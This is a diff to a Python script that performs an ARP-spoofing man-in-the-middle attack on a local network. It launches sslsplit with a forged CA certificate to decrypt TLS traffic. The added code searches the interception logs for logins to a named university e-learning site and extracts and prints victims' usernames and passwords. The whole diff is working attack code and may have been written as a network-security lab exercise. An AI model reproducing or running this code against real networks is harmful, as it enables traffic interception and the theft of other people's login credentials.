@@ -9,9 +9,12 @@ import scapy.all as scapy
 from subprocess import Popen, DEVNULL
 
 IP_MAC = []
-interface_name = "ens33"
+interface_name = "enp0s6"
 my_MAC = ""
 my_IP = ""
+log_dir = "./sslsplit_log"
+connect_log = 'connect.log'
+SIOCGIFADDR = 0x8915
 
 def get_my_MAC():
     global my_MAC, interface_name
@@ -21,7 +24,7 @@ def get_my_MAC():
 def get_my_IP():
     global my_IP, interface_name
     s = socket.socket(socket.SOCK_DGRAM)
-    raw_ip = ioctl(s.fileno(), scapy.SIOCGIFADDR, struct.pack('64s', interface_name.encode("utf-8")))[20:24]
+    raw_ip = ioctl(s.fileno(), SIOCGIFADDR, struct.pack('64s', interface_name.encode("utf-8")))[20:24]
     my_IP = socket.inet_ntoa(raw_ip)
     print("my IP", my_IP)
 
@@ -61,23 +64,63 @@ def ARP_spoofing():
             arp = scapy.ARP(op=2, pdst=IP, hwdst=MAC, psrc=other_IP, hwsrc=my_MAC)
             scapy.send(arp, verbose=False) # verbose=False -> disable packet sent notification
 def process_packets():
-    Popen(["sslsplit", "-D", '-p', 'sslsplit.pid', "-S", "sslsplit_log", 
+    Popen(["sslsplit", "-D", '-l', 'connect.log', '-p', 'sslsplit.pid', "-S","sslsplit_log", 
            "-k", "ca.key", "-c", "ca.crt",            
            "ssl", "0.0.0.0", "8443"],
            stdout=DEVNULL, stderr=DEVNULL)
     return
 
+def find_log_file():
+    # get the latest connect
+    find_log = os.popen(f"grep -s 'sni:e3.nycu.edu.tw' connect.log | tail -n 1").read().split() # -s: not print error
+    if(len(find_log) > 0):
+        find_name = f'{find_log[4]},{find_log[5]}' # ip,port
+        log_name = os.popen(f'ls {log_dir} | grep -s {find_name}').read().strip()
+        if(log_name):
+            return f'{log_dir}/{log_name}'
+    return 0
+
+#usr, pw, tok = 'username=', '&password=', '&token'
+def print_usr_passwd(log_path):
+    find_usr = os.popen(f'grep -s username {log_path}').read().strip()
+    if(not find_usr): 
+        print('entering...\n')
+        return
+    with open(log_path, 'rb') as b:
+        log = b.read()
+        usr_off = log.rfind('username='.encode())
+        pass_off = log.rfind('&password='.encode())
+        tok_off = log.rfind('&token'.encode())
+        
+        username = log[usr_off+len('username='):pass_off].decode()
+        password = log[pass_off+len('&password='):tok_off].decode()
+        print(f'username: {username}\npassowrd: {password}\n')
+
+def count_connect():
+    return os.popen(f'cat {connect_log} 2>/dev/null | grep -s sni:e3.nycu.edu.tw | wc -l').read().strip()
+
 get_my_MAC()
 get_my_IP()
 collect_IP_MAC_info()
 while True:
+    before_connect = count_connect()
+    print(f'\nconnect num before start: {before_connect}')
+    
     ARP_spoofing()
     process_packets()
-    time.sleep(10)
-    with open("ssl.pid") as pid_file:
+    for round in range(10):
+        print(f"#### {round+1} ####")
+        time.sleep(3)
+        after_connect = count_connect()
+        if(before_connect == after_connect): continue
+        
+        log_file = find_log_file()
+        if(log_file):
+            print_usr_passwd(log_file)
+
+    with open("sslsplit.pid") as pid_file:
         pid = next(pid_file).strip()
         os.kill(int(pid), signal.SIGTERM)
-
 
 
 # sniff(filter="arp", prn=ARP_spoofing, store=0)
